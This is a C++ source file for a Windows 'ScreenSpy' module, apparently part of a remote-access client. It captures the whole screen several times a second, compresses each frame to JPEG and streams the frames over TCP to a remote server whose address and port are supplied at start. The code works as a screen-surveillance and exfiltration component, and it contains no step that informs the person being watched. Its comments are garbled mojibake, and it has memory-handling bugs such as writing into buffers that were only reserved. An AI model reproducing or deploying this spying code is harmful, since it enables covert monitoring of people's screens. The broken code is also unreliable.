#include "ScreenSpy.h"

// �����壬����ȷ���̰߳�ȫ
static CRITICAL_SECTION gCs;
// ��ʼ����
static ScreenSpy spy;

ScreenSpy::ScreenSpy()
{
    // ��ʼ��������
    InitializeCriticalSection(&gCs);
}

ScreenSpy::~ScreenSpy()
{
    // ɾ��������
    DeleteCriticalSection(&gCs);
}


bool SaveBmpDataToFile(const std::vector<unsigned char>& imgData)
{
    // ���ļ��Խ���д��
    std::ofstream outFile("file.bmp", std::ios::binary);
    if (!outFile)
    {
        std::cout << "Failed to open file for writing!" << std::endl;
        return false;
    }

    // �� imgData ������ֱ��д���ļ�
    outFile.write(reinterpret_cast<const char*>(imgData.data()), imgData.size());

    // �ر��ļ�
    outFile.close();

    std::cout << "BMP data saved successfully!" << std::endl;
    return true;
}

bool ScreenSpy::captureScreen(std::vector<unsigned char>& bmpData)
{
    // ���������������̲߳��ܽ���
    EnterCriticalSection(&gCs);

    HBITMAP hBitmap;

    // �õ���Ļ�豸
    HDC hScrDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
    if (!hScrDC) {
        std::cout << "Failed to get screen device" << std::endl;
        std::fflush(stdout);

        // �����������
        LeaveCriticalSection(&gCs);
        return false;
    }

    // �����µ��豸
    HDC hRamDC = CreateCompatibleDC(hScrDC);
    if (!hRamDC) {
        std::cout << "Failed to create device" << std::endl;
        std::fflush(stdout);

        // �����������
        LeaveCriticalSection(&gCs);
        return false;
    }

    // ����ͼƬ��С
    unsigned int iByte = 3;  // ÿ������ 3 �ֽڣ�24 λ��ɫ��ȣ�
    unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
    unsigned int iHeight = GetSystemMetrics(SM_CYSCREEN);

    // ����ȡ����ȷ��iWidth��iHeight��4�ı���
    iWidth = (iWidth + 3) & ~3;
    iHeight = (iHeight + 3) & ~3;

    // ����λͼ
    BITMAPINFOHEADER bmpInfoHeader;
    BITMAPINFO bmpInfo;
    void* p;

    bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);  // ͷ�ṹ�Ĵ�С
    bmpInfoHeader.biBitCount = 24;                    // 24 λ��ɫ��ȣ�ÿ�������� R��G��B �����������
    bmpInfoHeader.biPlanes = 1;                        // ÿ������һ��ƽ��
    bmpInfoHeader.biCompression = BI_RGB;              // ��ѹ��
    bmpInfoHeader.biWidth = iWidth;                    // ͼ����
    bmpInfoHeader.biHeight = iHeight;                  // ͼ��߶�
    bmpInfoHeader.biSizeImage = 0;                     // ���գ�ϵͳ���Զ�����
    bmpInfoHeader.biXPelsPerMeter = 0;                 // ˮƽ�ֱ���
    bmpInfoHeader.biYPelsPerMeter = 0;                 // ��ֱ�ֱ���
    bmpInfoHeader.biClrUsed = 0;                       // ��ɫ���е���ɫ����0��ʾû�е�ɫ��
    bmpInfoHeader.biClrImportant = 0;                  // ��Ҫ��ɫ��
    bmpInfo.bmiHeader = bmpInfoHeader;                 // ����Ϣͷ��ֵ�� bmiHeader

    // ��ȡλͼ
    hBitmap = CreateDIBSection(hScrDC, &bmpInfo, DIB_RGB_COLORS, &p, NULL, 0);
    if (!hBitmap) {
        std::cout << "Failed to CreateDIBSection" << std::endl;
        std::fflush(stdout);

        // �����������
        LeaveCriticalSection(&gCs);
        return false;
    }

    // ���豸�����
    HBITMAP hBitmapOld;
    hBitmapOld = (HBITMAP)SelectObject(hRamDC, hBitmap);

    // ����Ļ���Ƶ���������豸��
    StretchBlt(hRamDC, 0, 0, iWidth, iHeight, hScrDC, 0, 0, iWidth, iHeight, SRCCOPY);

    // ����ͼƬ���ڴ�ռ�
    bmpData.reserve(iWidth * iHeight * 3);  // Reserve space for RGB data


    HDC hTmpDC = GetDC(NULL);
    hBitmap = (HBITMAP)SelectObject(hRamDC, hBitmapOld);

    bmpInfoHeader.biBitCount = 24;
    int iError = GetDIBits(hTmpDC, hBitmap, 0, iHeight, NULL, (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
    if (!iError) {
        std::cout << "Failed to GetDIBits" << std::endl;
        std::fflush(stdout);

        // �����������
        LeaveCriticalSection(&gCs);
        return false;
    }

    // ���ڴ��л�ȡλͼ����
    std::vector<unsigned char> imgData(bmpInfoHeader.biSizeImage);
    iError = GetDIBits(hTmpDC, hBitmap, 0, iHeight, imgData.data(), (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
    if (!iError) {
        std::cout << "Failed to GetDIBits" << std::endl;
        std::fflush(stdout);

        // �����������
        LeaveCriticalSection(&gCs);
        return false;
    }


    // BMP �ļ�ͷ
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfoHeader.biSizeImage;
    BITMAPFILEHEADER fileHeader = { 0 };
    fileHeader.bfType = 0x4D42;  // 'BM' �ļ���ʶ��
    fileHeader.bfSize = dwFileSize;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // �� BMP �ļ�ͷ��ͼ�����ݺϲ�
    bmpData.clear();
    bmpData.resize(dwFileSize);

    // д���ļ�ͷ
    memcpy(bmpData.data(), &fileHeader, sizeof(BITMAPFILEHEADER));
    memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bmpInfoHeader, sizeof(BITMAPINFOHEADER));
    memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), imgData.data(), imgData.size());

    //SaveBmpDataToFile(bmpData);

    // �ͷ��豸�����
    DeleteDC(hScrDC);
    DeleteDC(hRamDC);
    DeleteObject(hBitmapOld);
    DeleteDC(hTmpDC);
    DeleteObject(hBitmap);

    // �����������
    LeaveCriticalSection(&gCs);
    return true;
}


bool SaveToBmpFile(unsigned char* data, size_t size)
{
    // ���ļ��Խ���д��
    std::ofstream outFile("file.bmp", std::ios::binary);
    if (!outFile)
    {
        std::cout << "Failed to open file for writing!" << std::endl;
        return false;
    }

    // ������д���ļ�
    outFile.write(reinterpret_cast<const char*>(data), size);

    // �ر��ļ�
    outFile.close();

    std::cout << "BMP data saved successfully!" << std::endl;
    return true;
}


unsigned int  ScreenSpy::convertToJpgData(const std::vector<unsigned char>& bmpData,
    std::vector<unsigned char>& jpgData)
{
    // ���������������̲߳��ܽ���
    EnterCriticalSection(&gCs);

    //// ����ͼƬ��С
    //unsigned int iByte = 3;
    //unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
    //unsigned int iHeight = GetSystemMetrics(SM_CYSCREEN);

    //// ����ȡ����ȷ��iWidth��iHeight��4�ı���
    //iWidth = (iWidth + 3) & ~3;
    //iHeight = (iHeight + 3) & ~3;
    //unsigned int iBmpSize = iWidth * iHeight * iByte;
    //if (iWidth == 1366) {
    //    iWidth = 1360;
    //}

    ////  ���bitmap��jpg�ă��淽ʽ���෴,����Ҫ�������^��
    ////  ����: rgb: 1 2 3  ->  9 8 7
    ////            4 5 6  ->  6 5 4
    ////            7 8 9  ->  3 2 1
    //const unsigned char* bmp = bmpData.data();
    //std::vector<unsigned char> convertedBmp;
    //convertedBmp.reserve(iBmpSize);
    //unsigned char* cBmp = (unsigned char*)convertedBmp.data();

    //for (unsigned int i = 0, j; i < iHeight; i++)
    //{
    //    for (j = 0; j < iWidth; j++) {
    //        cBmp[i * iWidth * iByte + j * 3] = bmp[(iHeight - i - 1) * iWidth * iByte + j * iByte + 2];
    //        cBmp[i * iWidth * iByte + j * 3 + 1] = bmp[(iHeight - i - 1) * iWidth * iByte + j * iByte + 1];
    //        cBmp[i * iWidth * iByte + j * 3 + 2] = bmp[(iHeight - i - 1) * iWidth * iByte + j * iByte];
    //    }
    //}

    //// ����jpg�ṹ
    //struct jpeg_compress_struct jcs;
    //struct jpeg_error_mgr jem;

    //jcs.err = jpeg_std_error(&jem);
    //jpeg_create_compress(&jcs);

    //// �����������
    //jcs.image_height = iHeight;
    //jcs.image_width = iWidth;
    //jcs.input_components = iByte;
    //jcs.in_color_space = JCS_RGB;

    //jpeg_set_defaults(&jcs);

    //// ����ѹ������
    //const int quality = 30;     // Խ��Խ�ã�ԽСԽ�������Լ�����
    //jpeg_set_quality(&jcs, quality, TRUE);

    //// ��������ļ�����ʱ�ļ����ģ�����������ã�
    //const std::string fileName = "zero_client_screen_capture.tmp";
    //FILE* fp = fopen(fileName.data(), "wb+");
    //if (!fp) {
    //    std::cout << "Failed to create file " << fileName << " error:"
    //        << ferror(fp) << std::endl;
    //    std::fflush(stdout);

    //    // �����������
    //    LeaveCriticalSection(&gCs);
    //    return 0;
    //}

    //jpeg_stdio_dest(&jcs, fp);

    //// ��ʼѹ��
    //jpeg_start_compress(&jcs, TRUE);
    //JSAMPROW jr;
    //while (jcs.next_scanline < iHeight) {
    //    jr = &cBmp[jcs.next_scanline * iWidth * iByte];
    //    jpeg_write_scanlines(&jcs, &jr, 1);
    //}

    //// �ͷ�
    //jpeg_finish_compress(&jcs);
    //jpeg_destroy_compress(&jcs);
    //fclose(fp);

    //// ��ȡѹ���õ�����
    //FILE* fpIn = fopen(fileName.data(), "rb+");
    //if (!fpIn) {
    //    std::cout << "Failed to read file " << fileName << " error:"
    //        << ferror(fp) << std::endl;
    //    std::fflush(stdout);

    //    // �����������
    //    LeaveCriticalSection(&gCs);
    //    return 0;
    //}

    //// ��ȡjpg�ļ���С
    //fseek(fpIn, 0, SEEK_END);
    //size_t iLen = ftell(fpIn);
    //rewind(fpIn);

    //// ��ȡ
    //jpgData.reserve(iLen);
    //fread((unsigned char*)jpgData.data(), 1, iLen, fpIn);

    //// �ͷ�
    //fclose(fpIn);

    //// ɾ����ʱ�ļ�
    //DeleteFileA(fileName.data());
    jpgData.reserve(bmpData.size());
    //SaveToBmpFile((unsigned char*)bmpData.data(), bmpData.size());
    unsigned int iLen = bmp_to_jpg((unsigned char*)bmpData.data(), jpgData.data());
    //SaveToBmpFile((unsigned char*)jpgData.data(), iLen);
    // �����������
    LeaveCriticalSection(&gCs);
    return iLen;
}

void ScreenSpy::startByNewThread(std::string domain, int port)
{
    // �������Ͷ˿�����ת����һ���ַ�ָ������
    char* args = new char[MAX_PATH + sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args, domain.data(), MAX_PATH);
    memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

    // �������߳�
    HANDLE h = CreateThread(NULL, 0, ScreenSpy::threadProc, (LPVOID)args, 0, NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD WINAPI ScreenSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args + MAX_PATH));
    startScreenSpy(domain, port);

    // �ͷŲ���
    delete (char*)args;
    return 0;
}

void ScreenSpy::startScreenSpy(std::string domain, int port)
{
    // ����socket�������������
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect screen spy server " << domain << ":" << port << std::endl;
        std::fflush(stdout);
        return;
    }

    // ��ʼ�����Ϣ
    std::cout << "Started screen spy" << std::endl;
    std::fflush(stdout);
    // ��ȡ��Ļ���ٰ���ת����jpg��ʽ
    thread_local std::vector<unsigned char> jpg;
    thread_local std::vector<unsigned char> bmp;

    // ��ʼ��������
    const int fps = 5;  // ÿ��֡�ȣ������Լ�����
    while (1)
    {
        
        Sleep(1000 / fps);

        

        if (!captureScreen(bmp))
        {
            sock.dissconnect();
            break;
        }

        unsigned int len = 0;
        if ((len = convertToJpgData(bmp, jpg)) == 0)
        {
            sock.dissconnect();
            break;
        }

        // ��������
        if (!sendScreenData(&sock, jpg, len))
        {
            break;
        }


    }


    //bmp.clear();
    //jpg.clear();

    // ���
    std::cout << "Finished screen spy" << std::endl;
    std::fflush(stdout);
}

bool ScreenSpy::sendScreenData(TcpSocket* sock, std::vector<unsigned char>& jpg, unsigned int len)
{
    // ����ͷ��
    ScreenSpyHeader header;
    header.len = len;
    if (!sock->sendData((char*)&header, sizeof(ScreenSpyHeader))) {  //���ֱ�ӷ���һ�������ݣ����ն˾��޷���ǰ֪�����ݵ��ܳ��ȣ����ܵ������ݴ����ӻ���
        return false;
    }

    // ����jpg���ݰ�������Сÿ���������1000�������ﶨ��800
    const unsigned int paketLen = 800;
    char* data = (char*)jpg.data();
    unsigned int pos = 0;//pos���ѷ������ݵ�λ�ã�ƫ����������ʼΪ 0��

    while (pos < len) {
        int sendSize = (pos + paketLen) > len ? len - pos : paketLen;

        if (!sock->sendData(data + pos, sendSize)) {  //�� data + pos ��ʼ�� sendSize �ֽڷ��͵����硣
            return false;
        }

        pos += sendSize;
    }

    return true;
}
